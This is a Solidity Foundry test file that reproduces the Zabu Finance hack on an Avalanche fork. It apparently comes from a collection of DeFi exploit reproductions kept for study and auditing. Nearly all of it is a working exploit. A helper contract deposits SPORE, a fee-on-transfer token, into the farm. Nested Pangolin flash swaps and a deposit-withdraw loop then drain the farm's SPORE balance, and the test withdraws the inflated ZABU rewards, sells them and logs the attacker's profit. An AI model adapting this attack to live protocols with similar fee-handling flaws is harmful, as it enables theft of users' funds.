pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://slowmist.medium.com/brief-analysis-of-zabu-finance-being-hacked-44243919ea29

interface ZABUFarm {
    function deposit(uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function emergencyWithdraw(uint256 _pid) external;
}

interface PangolinRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract depositToken {
    IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);
    Uni_Router_V2 Router = Uni_Router_V2(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);
    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);

    function depositSPORE() external payable {
        address(WAVAX).call{value: 1 ether}("");
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(SPORE);
        WAVAX.approve(address(Router), type(uint256).max);
        SPORE.approve(address(Farm), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WAVAX.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        Farm.deposit(uint256(38), SPORE.balanceOf(address(this)));
    }

    function withdrawSPORE() external {
        Farm.withdraw(uint256(38), SPORE.balanceOf(address(Farm)));
    }

    function sellZABU() external {
        address[] memory path = new address[](2);
        path[0] = address(ZABU);
        path[1] = address(WAVAX);
        WAVAX.approve(address(Router), type(uint256).max);
        ZABU.approve(address(Router), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ZABU.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}

contract ContractTest is Test {
    IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);
    IERC20 PNG = IERC20(0x60781C2586D68229fde47564546784ab3fACA982);
    Uni_Router_V2 Router = Uni_Router_V2(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);
    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);
    Uni_Pair_V2 PangolinPair1 = Uni_Pair_V2(0x0a63179a8838b5729E79D239940d7e29e40A0116); // SPORE WAVAX
    Uni_Pair_V2 PangolinPair2 = Uni_Pair_V2(0xad24a72ffE0466399e6F69b9332022a71408f10b); // SPORE PNG
    address addressContract;
    uint256 reserve0Pair1;
    uint256 reserve1Pair1;
    uint256 reserve0Pair2;
    uint256 reserve1Pair2;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 4_177_751);
    }

    function testExploit() public payable {
        SPORE.approve(address(Farm), type(uint256).max);
        WAVAX.approve(address(Router), type(uint256).max);
        (reserve0Pair1, reserve1Pair1,) = PangolinPair1.getReserves();
        (reserve0Pair2, reserve1Pair2,) = PangolinPair2.getReserves();
        address(WAVAX).call{value: 2500 ether}("");
        // depost SPORE
        ContractFactory();
        (bool success,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature("depositSPORE()"));
        require(success);
        // change block.number
        cheats.roll(block.number + 900);

        PangolinPair1.swap(SPORE.balanceOf(address(PangolinPair1)) - 1 * 1e18, 0, address(this), new bytes(1));
        // change block.number
        cheats.roll(block.number + 1001);
        (bool success1,) = addressContract.call(abi.encodeWithSignature("withdrawSPORE()"));
        require(success1);

        emit log_named_decimal_uint("Attacker ZABU profit after exploit", ZABU.balanceOf(addressContract), 18);

        (bool success2,) = addressContract.call(abi.encodeWithSignature("sellZABU()"));
        require(success2);

        emit log_named_decimal_uint(
            "Attacker WAVAX profit after exploit", WAVAX.balanceOf(addressContract) - 2500 * 1e18, 18
        );
    }

    function pangolinCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (msg.sender == address(PangolinPair1)) {
            PangolinPair2.swap(0, reserve1Pair2 - 1 * 1e18, address(this), new bytes(1));
            // flashswap callback pair1
            uint256 amountSPORE0 = SPORE.balanceOf(address(this));
            SPORE.transfer(address(PangolinPair1), amountSPORE0);
            uint256 SPOREInPair1 = SPORE.balanceOf(address(PangolinPair1));
            uint256 WAVAXInPair1 = WAVAX.balanceOf(address(PangolinPair1));
            uint256 amountWAVAX = (
                reserve0Pair1 * reserve1Pair1 / ((SPOREInPair1 * 1000 - amountSPORE0 * 3 * 96 / 100) / 1000)
                    - WAVAXInPair1
            ) * 1000 / 997;
            WAVAX.transfer(address(PangolinPair1), amountWAVAX);
        }

        if (msg.sender == address(PangolinPair2)) {
            //reduced lptoken
            while (SPORE.balanceOf(address(Farm)) > 1000) {
                uint256 amount = SPORE.balanceOf(address(this));
                if (SPORE.balanceOf(address(this)) * 6 / 100 > SPORE.balanceOf(address(Farm))) {
                    amount = SPORE.balanceOf(address(Farm)) * 100 / 6;
                }
                Farm.deposit(uint256(38), amount);
                Farm.withdraw(uint256(38), amount);
            }

            // flashswap callback pair2
            uint256 amountSPORE1 = SPORE.balanceOf(address(this)) / 3;
            SPORE.transfer(address(PangolinPair2), amountSPORE1);
            uint256 SPOREInPari2 = SPORE.balanceOf(address(PangolinPair2));
            uint256 PNGInPair2 = PNG.balanceOf(address(PangolinPair2));
            uint256 amountPNG = (
                reserve0Pair2 * reserve1Pair2 / ((SPOREInPari2 * 1000 - amountSPORE1 * 3 * 96 / 100) / 1000)
                    - PNGInPair2
            ) * 1000 / 997;
            buyPNG(amountPNG);
            PNG.transfer(address(PangolinPair2), PNG.balanceOf(address(this)));
        }
    }

    function ContractFactory() public {
        address _add;
        bytes memory bytecode = type(depositToken).creationCode;
        assembly {
            _add := create2(0, add(bytecode, 32), mload(bytecode), 1)
        }
        addressContract = _add;
    }

    function buyPNG(uint256 amount) public {
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(PNG);
        Router.swapTokensForExactTokens(amount, WAVAX.balanceOf(address(this)), path, address(this), block.timestamp);
    }
}
